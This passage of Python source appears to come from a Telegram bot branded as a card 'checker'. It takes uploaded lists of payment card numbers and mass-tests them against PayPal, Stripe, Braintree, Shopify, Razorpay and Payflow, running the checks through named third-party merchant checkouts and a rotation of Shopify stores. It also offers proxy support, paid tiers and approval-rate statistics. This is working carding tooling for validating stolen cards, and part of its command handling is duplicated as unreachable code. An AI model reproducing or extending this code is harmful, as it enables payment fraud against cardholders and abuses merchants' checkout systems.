                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_shopify':
            if not user_manager.can_access_gateway(user_id, 'shopify'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to this gateway. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['gateway'] = 'shopify'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Shopify</b>\n\n"
                            "This will use the Shopify API.\n\n"
                            "<b>Commands:</b>\n"
                            "/shc &lt;card&gt; - Single check\n"
                            "/shmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_razorpay':
            if not user_manager.can_access_gateway(user_id, 'razorpay'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to this gateway. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['gateway'] = 'razorpay'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Razorpay (INR)</b>\n\n"
                            "Please configure your Razorpay settings:\n\n"
                            "<b>Commands:</b>\n"
                            "/rzc &lt;card&gt; - Single check\n"
                            "/rzmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=razorpay_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_stripe_charge':
            context.user_data['gateway'] = 'stripe_charge'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Stripe Charge</b>\n\n"
                            "This will use Stripe's charge API via texassouthernacademy.com.\n\n"
                            "<b>Commands:</b>\n"
                            "/stc &lt;card&gt; - Single check\n"
                            "/stmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_stripe_auth':
            context.user_data['gateway'] = 'stripe_auth'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Stripe Auth</b>\n\n"
                            "This will use Stripe's auth API via alevelbiology.co.uk.\n"
                            "No charge, just authorization.\n\n"
                            "<b>Commands:</b>\n"
                            "/chk &lt;card&gt; - Single check\n"
                            "/stamc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_braintree':
            if not user_manager.can_access_gateway(user_id, 'braintree'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to this gateway. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['gateway'] = 'braintree'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Braintree Direct</b>\n\n"
                            "This will use Braintree's GraphQL API.\n\n"
                            "<b>Commands:</b>\n"
                            "/btc &lt;card&gt; - Single check\n"
                            "/btmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_autosopi':
            if not user_manager.can_access_gateway(user_id, 'autosopi'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to this gateway. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['gateway'] = 'autosopi'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Autosopi</b>\n\n"
                            f"Current sites in rotation: {len(autosopi_site_manager.sites)} active, {len(autosopi_site_manager.pending_sites)} pending.\n\n"
                            "<b>Commands:</b>\n"
                            "/auc &lt;card&gt; - Single check\n"
                            "/aumc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=autosopi_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'gateway_payflow':
            if not user_manager.can_access_gateway(user_id, 'payflow'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to this gateway.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['gateway'] = 'payflow'
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Gateway set to: Payflow (with proxy support)</b>\n\n"
                            "This will use the Payflow gateway via SpeechBuddy checkout.\n"
                            "Amount: $14.99 per card (fixed)\n"
                            "NOW WITH PROXY SUPPORT! All proxy formats supported.\n\n"
                            "<b>Commands:</b>\n"
                            "/pfc &lt;card&gt; - Single check\n"
                            "/pfmc &lt;cards&gt; - Mass check",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_list':
            sites_list = autosopi_site_manager.list_sites()
            try:
                await query.edit_message_caption(
                    caption=sites_list,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_stats':
            sites = autosopi_site_manager.sites
            stats = autosopi_site_manager.site_stats
            failures = autosopi_site_manager.site_failures
            
            if not sites:
                try:
                    await query.edit_message_caption(
                        caption="No sites available.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            
            msg = "📊 <b>Autosopi Site Statistics</b>\n\n"
            
            total_checks = 0
            total_success = 0
            dead_sites = sum(1 for site in failures if failures.get(site, 0) >= 3)
            
            for site in sites:
                site_stats = stats.get(site, {})
                successes = site_stats.get('successes', 0)
                total = site_stats.get('total', 0)
                total_checks += total
                total_success += successes
            
            msg += f"📝 Active Sites: {len(sites)}\n"
            msg += f"💀 Sites with 3+ Failures: {dead_sites}\n"
            msg += f"✅ Total Successes: {total_success}\n"
            msg += f"📊 Total Checks: {total_checks}\n"
            if total_checks > 0:
                msg += f"📈 Overall Success Rate: {total_success/total_checks*100:.1f}%\n"
            msg += f"\n<i>⚠️ Sites are removed after 3 consecutive failures only</i>"
            
            try:
                await query.edit_message_caption(
                    caption=msg,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_submit':
            context.user_data['waiting_for_autosopi_submit'] = True
            can_add_directly = user_manager.can_add_autosopi_sites_directly(user_id)
            if can_add_directly:
                try:
                    await query.edit_message_caption(
                        caption="📤 <b>Add Autosopi Site</b>\n\n"
                                "Send the site URL to add:\n"
                                "Example: <code>savelacougars.myshopify.com</code>\n"
                                "Example: <code>https://savelacougars.myshopify.com</code>\n\n"
                                "✅ <b>Your tier allows direct addition!</b>\n"
                                "The site will be tested and added immediately.\n\n"
                                "For bulk submission: Send a .txt file with 'site' in the name",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
            else:
                try:
                    await query.edit_message_caption(
                        caption="📤 <b>Submit Autosopi Site</b>\n\n"
                                "Send the site URL to submit:\n"
                                "Example: <code>savelacougars.myshopify.com</code>\n"
                                "Example: <code>https://savelacougars.myshopify.com</code>\n\n"
                                "⏳ <b>Free users:</b> Sites go to pending for admin approval.\n"
                                "⚡ Upgrade to Premium/Ultimate for direct addition!\n\n"
                                "For bulk submission: Send a .txt file with 'site' in the name",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_rotate':
            autosopi_site_manager.reset_rotation()
            current = autosopi_site_manager.get_next_site()
            try:
                await query.edit_message_caption(
                    caption=f"🔄 <b>Rotation Reset</b>\n\n"
                            f"Next site: <code>{current}</code>\n"
                            f"Total sites in rotation: {len(autosopi_site_manager.sites)}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_test':
            context.user_data['waiting_for_autosopi_test'] = True
            try:
                await query.edit_message_caption(
                    caption="🧪 <b>Test Autosopi Site</b>\n\n"
                            "Send the site URL to test:\n"
                            "Example: <code>savelacougars.myshopify.com</code>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_test_all':
            if user_id != OWNER_ID:
                try:
                    await query.edit_message_caption(
                        caption="❌ Only owner can test all sites.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            try:
                await query.edit_message_caption(
                    caption="🧪 Testing all Autosopi sites... This may take a moment.",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
            await autosopi_test_all_command(update, context)
        
        elif query.data == 'autosopi_pending':
            if user_id != OWNER_ID:
                try:
                    await query.edit_message_caption(
                        caption="❌ Only owner can view pending sites.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            pending_list = autosopi_site_manager.list_pending_sites()
            try:
                await query.edit_message_caption(
                    caption=pending_list,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_add':
            if user_id != OWNER_ID:
                try:
                    await query.edit_message_caption(
                        caption="❌ Only owner can add sites directly.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['waiting_for_autosopi_add'] = True
            try:
                await query.edit_message_caption(
                    caption="➕ <b>Add Autosopi Site (Direct)</b>\n\n"
                            "Send the site URL to add:\n"
                            "Example: <code>savelacougars.myshopify.com</code>\n\n"
                            "The site will be tested and added directly to rotation.",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'autosopi_remove':
            if user_id != OWNER_ID:
                try:
                    await query.edit_message_caption(
                        caption="❌ Only owner can remove sites.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['waiting_for_autosopi_remove'] = True
            try:
                await query.edit_message_caption(
                    caption="❌ <b>Remove Autosopi Site</b>\n\n"
                            "Send the site URL to remove:\n"
                            "Example: <code>savelacougars.myshopify.com</code>\n\n"
                            "You can send the exact URL or just the domain.",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'razorpay_amount':
            if not user_manager.can_access_gateway(user_id, 'razorpay'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to Razorpay. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['waiting_for_razorpay_amount'] = True
            try:
                await query.edit_message_caption(
                    caption="💰 <b>Enter Razorpay Amount (INR)</b>\n\n"
                            "Send the amount in Indian Rupees:\n"
                            "Example: <code>100</code> for ₹100\n\n"
                            "<i>Minimum: ₹1, Maximum: ₹100000</i>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'razorpay_site':
            if not user_manager.can_access_gateway(user_id, 'razorpay'):
                try:
                    await query.edit_message_caption(
                        caption="❌ Your tier doesn't have access to Razorpay. Upgrade to premium or ultimate.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
                return
            context.user_data['waiting_for_razorpay_site'] = True
            try:
                await query.edit_message_caption(
                    caption="🌐 <b>Enter Razorpay Site/Merchant Identifier</b>\n\n"
                            "Send the site/merchant ID or domain:\n"
                            "Example: <code>https://pages.razorpay.com/iicdelhi</code>\n\n"
                            "<i>This will be passed as the 'site' parameter to the API</i>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'stats':
            global checked_count, approved_count
            success_rate = (approved_count/checked_count)*100 if checked_count > 0 else 0
            amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
            total_volume = approved_count * float(amount)
            stats = f"📊 <b>Statistics</b>\n\n✅ Approved: {approved_count}\n❌ Declined: {checked_count - approved_count}\n📝 Total: {checked_count}\n💰 Volume: ${total_volume:.2f}\n📈 Rate: {round(success_rate, 1)}%"
            try:
                await query.edit_message_caption(
                    caption=stats,
                    parse_mode=ParseMode.HTML,
                    reply_markup=back_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'h_file':
           await query.edit_message_caption(
               caption="📁 <b>Send a .txt file with cards</b>\n\n"
                        "Format per line (any format):\n"
                        "After sending the file, reply to it with a mass check command.",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
           )
           
        elif query.data == 'h_text':
            await query.edit_message_caption(
                caption="💳 <b>Send cards as text</b>\n\n"
                        "Use /aumc for Autosopi, etc.",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
            )
                
        
        # ============ NEW HANDLERS FOR FILE MASS CHECK BUTTONS ============
        elif query.data.startswith('mass_'):
            parts = query.data.split('_')
            if len(parts) >= 3:
                gateway = parts[1]
                target_user_id = int(parts[2])
                
                # Only the user who sent the file can use these buttons
                if user_id != target_user_id:
                    await query.answer("❌ This file doesn't belong to you!", show_alert=True)
                    return
                
                if user_id in pending_files:
                    file_data = pending_files.pop(user_id)
                    cards = file_data['cards']
                    
                    # Check limits
                    tier = user_manager.get_tier(user_id)
                    max_batch = user_manager.get_max_batch_size(user_id)
                    if len(cards) > max_batch:
                        cards = cards[:max_batch]
                    
                    context.user_data['gateway'] = gateway
                    
                    try:
                        await query.edit_message_text(
                            text=f"✅ <b>Processing file with {gateway.upper()} gateway</b>\n\n"
                                 f"📝 Cards: {len(cards)}\n"
                                 f"🚀 Starting check...",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as e:
                        print(f"⚠️ Could not edit message: {e}")
                    
                    # Start the appropriate mass check
                    if gateway == 'paypal':
                        asyncio.create_task(mass_check_logic(update, context, cards))
                    elif gateway == 'shopify':
                        asyncio.create_task(shopify_mass_check_logic(update, context, cards))
                    elif gateway == 'razorpay':
                        asyncio.create_task(razorpay_mass_check_logic(update, context, cards))
                    elif gateway == 'stripe_charge':
                        asyncio.create_task(stripe_charge_mass_check_logic(update, context, cards))
                    elif gateway == 'stripe_auth':
                        asyncio.create_task(stripe_auth_mass_check_logic(update, context, cards))
                    elif gateway == 'braintree':
                        asyncio.create_task(mass_check_braintree_advanced(update, context))
                    elif gateway == 'autosopi':
                        asyncio.create_task(autosopi_mass_check_logic(update, context, cards))
                    elif gateway == 'payflow':
                        asyncio.create_task(payflow_mass_check_logic(update, context, cards))
                else:
                    try:
                        await query.edit_message_text(
                            text="❌ File expired or already processed.",
                            parse_mode=ParseMode.HTML,
                            reply_markup=back_menu()
                        )
                    except Exception as e:
                        print(f"⚠️ Could not edit message: {e}")
        
        elif query.data.startswith('cancel_file_'):
            target_user_id = int(query.data.split('_')[2])
            
            if user_id != target_user_id:
                await query.answer("❌ This file doesn't belong to you!", show_alert=True)
                return
            
            if user_id in pending_files:
                pending_files.pop(user_id)
                try:
                    await query.edit_message_text(
                        text="❌ File processing cancelled.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
            else:
                try:
                    await query.edit_message_text(
                        text="❌ No pending file found.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=back_menu()
                    )
                except Exception as e:
                    print(f"⚠️ Could not edit message: {e}")
        
        elif query.data == 'back_main':
            amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
            gateway = context.user_data.get('gateway', 'paypal')
            tier = user_manager.get_tier(user_id)
            speed = TIER_SPEEDS.get(tier, 900)
            concurrency = TIER_CONCURRENCY.get(tier, 1)
            
            gateway_display = {
                'paypal': 'PayPal',
                'shopify': 'Shopify',
                'razorpay': 'Razorpay',
                'stripe_charge': 'Stripe Charge',
                'stripe_auth': 'Stripe Auth',
                'braintree': 'Braintree',
                'autosopi': 'Autosopi',
                'payflow': 'Payflow'
            }.get(gateway, 'PayPal')
            
            caption = (
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"<b>BLADESARKS(CHECKER)</b>\n"
                f"★ Status : Active ✔\n\n"
                f"★ ID ✉️ <code>{user_id}</code>\n"
                f"★ User ✉️ {update.effective_user.username or 'None'}\n"
                f"★ Name ✉️ {update.effective_user.first_name} [{tier.upper()}]\n"
                f"@Cypher099\n"
                f"━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>Current Settings:</b>\n"
                f"💰 Amount: ${amount}\n"
                f"🌐 Gateway: {gateway_display}\n"
                f"⚡ Speed: {speed} cards/hour\n"
                f"🔀 Parallel: {concurrency}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            try:
                await query.edit_message_caption(
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    reply_markup=main_menu()
                )
            except Exception as e:
                print(f"⚠️ Could not edit message: {e}")
    
    except Exception as e:
        print(f"❌ Error in button callback: {e}")
        try:
            await query.edit_message_caption(
                caption=f"❌ Error: {str(e)[:100]}",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
            )
        except Exception as edit_error:
            print(f"❌ Could not send error message: {edit_error}")
# --- HANDLER FOR REPLY MESSAGES ---
async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle when user replies to a file message with a command"""
    # Check if this is a reply
    if not update.message.reply_to_message:
        return False
    
    user_id = update.effective_user.id
    reply_to_msg_id = update.message.reply_to_message.message_id
    
    # Check if this user has a pending file
    if user_id not in pending_files:
        return False
    
    file_data = pending_files[user_id]
    
    # Check if the reply is to the file message
    if file_data.get('message_id') != reply_to_msg_id:
        return False
    
    # Get the command text (remove the leading /)
    text = update.message.text.strip()
    
    # Check for cancel
    if text.lower() == '/cancel':
        pending_files.pop(user_id)
        await update.message.reply_text("✅ File processing cancelled.")
        return True
    
    # Map commands to gateways - ADD /nstripem HERE
    gateway_map = {
        '/aumc': 'autosopi',
        '/aumcheck': 'autosopi',
        '/ppmc': 'paypal',
        '/ppmcheck': 'paypal',
        '/mb3': 'b3charged',
        '/b3mass': 'b3charged',
        '/mchk': 'auto_stripe',
        '/mcheck': 'auto_stripe',
        '/shmc': 'shopify',
        '/shmcheck': 'shopify',
        '/msh': 'shopify',
        '/mshcheck': 'shopify',
        '/nstripem': 'new_stripe',      # ADD THIS LINE
        '/nstripmass': 'new_stripe',     # ADD THIS LINE (alias)
        '/nstripefile': 'new_stripe',    # ADD THIS LINE (alias)
        '/rzmc': 'razorpay',
        '/rzmcheck': 'razorpay',
        '/stmc': 'stripe_charge',
        '/stmcheck': 'stripe_charge',
        '/stamc': 'stripe_auth',
        '/stamcheck': 'stripe_auth',
        '/btnm': 'braintree',
        '/btmcheck': 'braintree',
        '/pfmc': 'payflow',
        '/pfmcheck': 'payflow',
    }
    
    # Extract command (first word)
    command = text.lower().split()[0] if text else ''
    gateway = gateway_map.get(command)
    
    if not gateway:
        await update.message.reply_text(
            f"❌ Invalid command. Use one of:\n"
            f"/ppmc - PayPal\n"
            f"/mb3 - B3Charged\n"
            f"/mchk - Auto Stripe\n"
            f"/msh - Shopify\n"
            f"/nstripem - New Stripe\n"      # ADD THIS LINE
            f"/rzmc - Razorpay\n"
            f"/stmc - Stripe Charge\n"
        )
        return True
    
    # Check access for new_stripe
    if gateway == 'new_stripe':
        if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
            await update.message.reply_text(f"❌ Your tier doesn't have access to New Stripe gateway.")
            return True
    
    # Get cards from file
    file_data = pending_files.pop(user_id)
    cards = file_data['cards']
    
    # Check batch limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await update.message.reply_text(f"⚠️ Truncated to {max_batch} cards (your tier limit)")
    
    # Send progress message
    progress_msg = await update.message.reply_text(
        f"✅ Processing {len(cards)} cards with NEW STRIPE API\n"
        f"📍 Starting...",
        reply_markup=create_progress_buttons(0, len(cards), 0, 0, "", "Starting...")
    )
    
    # Start the check for new_stripe
    if gateway == 'new_stripe':
        asyncio.create_task(new_stripe_mass_check_from_file(update, context, cards, progress_msg))
    elif gateway == 'autosopi':
        asyncio.create_task(autosopi_mass_check_logic(update, context, cards, progress_msg))
    elif gateway == 'paypal':
        asyncio.create_task(mass_check_logic(update, context, cards))
    elif gateway == 'b3charged':
        asyncio.create_task(b3charged_mass_check_logic(update, context, cards, progress_msg))
    elif gateway == 'auto_stripe':
        site = auto_stripe_site_manager.get_site_for_user(user_id)
        if not site:
            await progress_msg.edit_text("❌ No site configured. Use /setautosite")
            return True
        asyncio.create_task(auto_stripe_mass_check_logic_with_progress(update, context, cards, site, progress_msg))
    elif gateway == 'shopify':
        asyncio.create_task(shopify_mass_check_logic(update, context, cards, progress_msg))
    elif gateway == 'razorpay':
        asyncio.create_task(razorpay_mass_check_logic(update, context, cards))
    elif gateway == 'stripe_charge':
        asyncio.create_task(stripe_charge_mass_check_logic(update, context, cards))
    elif gateway == 'stripe_auth':
        asyncio.create_task(stripe_auth_mass_check_logic(update, context, cards))
    elif gateway == 'braintree':
        context.args = cards
        asyncio.create_task(mass_check_braintree_advanced(update, context))
    elif gateway == 'payflow':
        asyncio.create_task(payflow_mass_check_logic(update, context, cards))
    
    # Delete the command message to keep chat clean
    try:
        await update.message.delete()
    except:
        pass
    
    return True
    
    # Check access
    # For shopify gateway, we need to check paypal access (since it uses PayPal API internally)
    if gateway == 'shopify':
        if not user_manager.can_access_gateway(user_id, 'paypal'):
            await update.message.reply_text(f"❌ Your tier doesn't have access to Shopify gateway.")
            return True
    else:
        if not user_manager.can_access_gateway(user_id, gateway):
            await update.message.reply_text(f"❌ Your tier doesn't have access to {gateway}.")
            return True
    
    # Get cards from file
    file_data = pending_files.pop(user_id)
    cards = file_data['cards']
    
    # Check batch limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await update.message.reply_text(f"⚠️ Truncated to {max_batch} cards (your tier limit)")
    
    # Send progress message
    progress_msg = await update.message.reply_text(
        f"✅ Processing {len(cards)} cards with {gateway.upper()}\n"
        f"📍 Starting...",
        reply_markup=create_progress_buttons(0, len(cards), 0, 0, "", "Starting...")
    )
    
    # Start the check
    if gateway == 'autosopi':
        asyncio.create_task(autosopi_mass_check_logic(update, context, cards, progress_msg))
    elif gateway == 'paypal':
        asyncio.create_task(mass_check_logic(update, context, cards))
    elif gateway == 'b3charged':
        asyncio.create_task(b3charged_mass_check_logic(update, context, cards, progress_msg))
    elif gateway == 'auto_stripe':
        site = auto_stripe_site_manager.get_site_for_user(user_id)
        if not site:
            await progress_msg.edit_text("❌ No site configured. Use /setautosite")
            return True
        asyncio.create_task(auto_stripe_mass_check_logic_with_progress(update, context, cards, site, progress_msg))
    elif gateway == 'shopify':
        asyncio.create_task(shopify_mass_check_logic(update, context, cards, progress_msg))  # Make sure this accepts progress_msg
    elif gateway == 'razorpay':
        asyncio.create_task(razorpay_mass_check_logic(update, context, cards))
    elif gateway == 'stripe_charge':
        asyncio.create_task(stripe_charge_mass_check_logic(update, context, cards))
    elif gateway == 'stripe_auth':
        asyncio.create_task(stripe_auth_mass_check_logic(update, context, cards))
    elif gateway == 'braintree':
        context.args = cards
        asyncio.create_task(mass_check_braintree_advanced(update, context))
    elif gateway == 'payflow':
        asyncio.create_task(payflow_mass_check_logic(update, context, cards))
    
    # Delete the command message to keep chat clean
    try:
        await update.message.delete()
    except:
        pass
    
    return True

# --- DOCUMENT HANDLER ---
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded document files (cards, proxies, sites)"""
    user_id = update.effective_user.id
    
    if not is_user_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return
    
    if not await check_group_membership(update, context):
        return
    
    file_name = update.message.document.file_name.lower()
    
    if 'proxy' in file_name or 'proxies' in file_name:
        await handle_proxy_file(update, context)
        return
    
    if 'site' in file_name or 'sites' in file_name:
        await handle_site_file(update, context)
        return
    
    if not file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file")
        return
    
    try:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        cards = card_formatter.extract_cards(content)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file.")
            return
        
        # Store the file content and cards for this user
        pending_files[user_id] = {
            'content': content,
            'cards': cards,
            'filename': file_name,
            'message_id': update.message.message_id,
            'chat_id': update.message.chat_id,
            'timestamp': time.time()
        }
        
        # Show preview of the file
        preview = "\n".join(cards[:5])
        if len(cards) > 5:
            preview += f"\n... and {len(cards) - 5} more cards"
        
        tier = user_manager.get_tier(user_id)
        max_batch = user_manager.get_max_batch_size(user_id)
        
        if len(cards) > max_batch:
            warning = f"⚠️ Your tier allows max {max_batch} cards. Only first {max_batch} will be processed.\n\n"
            cards = cards[:max_batch]
        else:
            warning = ""
        
        # Simple reply message - user replies with mass check command
        await update.message.reply_text(
            f"📁 <b>File received: {file_name}</b>\n\n"
            f"{warning}"
            f"📊 Found {len(cards)} valid cards\n\n"
            f"💡 <b>Reply to the file with a mass  command:</b>\n\n"
            f"<i>Or cancel with: /cancel</i>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=update.message.message_id
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel pending file processing"""
    user_id = update.effective_user.id
    
    if user_id in pending_files:
        pending_files.pop(user_id)
        await update.message.reply_text("✅ File processing cancelled.", reply_markup=back_menu())
    else:
        await update.message.reply_text("❌ No pending file to cancel.")
        
# ============ SITE REMOVAL COMMAND ============

async def remove_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a site from Autosopi rotation (admin only)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove sites.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🗑️ <b>Remove Autosopi Site</b>\n\n"
            "Usage: <code>/removesite &lt;site_url&gt;</code>\n"
            "Example: <code>/removesite bndlstech.myshopify.com</code>\n\n"
            "This will permanently remove the site from rotation.\n\n"
            "To see all sites: /sites",
            parse_mode=ParseMode.HTML
        )
        return
    
    site = " ".join(context.args)
    
    # Call the existing remove_site method from autosopi_site_manager
    success, result_msg = autosopi_site_manager.remove_site(site, user_id)
    
    await update.message.reply_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def remove_fake_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all sites that return authorize.net fake responses (admin only)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove sites.")
        return
    
    # Check for sites that might be fake (based on known fake patterns)
    fake_patterns = ["authorize.net", "authorizenet", "bndlstech", "fake"]
    
    removed_sites = []
    failed_sites = []
    
    for site in autosopi_site_manager.sites[:]:  # Create a copy to iterate
        is_fake = False
        for pattern in fake_patterns:
            if pattern in site.lower():
                is_fake = True
                break
        
        if is_fake:
            success, msg = autosopi_site_manager.remove_site(site, user_id)
            if success:
                removed_sites.append(site)
            else:
                failed_sites.append(site)
    
    if removed_sites:
        result = f"✅ <b>Removed {len(removed_sites)} fake sites:</b>\n\n"
        for site in removed_sites[:10]:
            result += f"• <code>{site}</code>\n"
        if len(removed_sites) > 10:
            result += f"• ... and {len(removed_sites) - 10} more\n"
    else:
        result = "📋 No fake sites found to remove.\n"
    
    if failed_sites:
        result += f"\n⚠️ Failed to remove {len(failed_sites)} sites."
    
    await update.message.reply_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def list_sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all Autosopi sites with option to remove"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not user_manager.can_access_gateway(user_id, 'autosopi'):
        await update.message.reply_text("❌ Your tier doesn't have access to Autosopi gateway.")
        return
    
    sites = autosopi_site_manager.sites
    failures = autosopi_site_manager.site_failures
    
    if not sites:
        await update.message.reply_text("📋 No sites available.")
        return
    
    msg = "🌐 <b>Autosopi Sites in Rotation</b>\n\n"
    
    for i, site in enumerate(sites, 1):
        fail_count = failures.get(site, 0)
        if fail_count >= 3:
            status = "💀 DEAD"
        elif fail_count > 0:
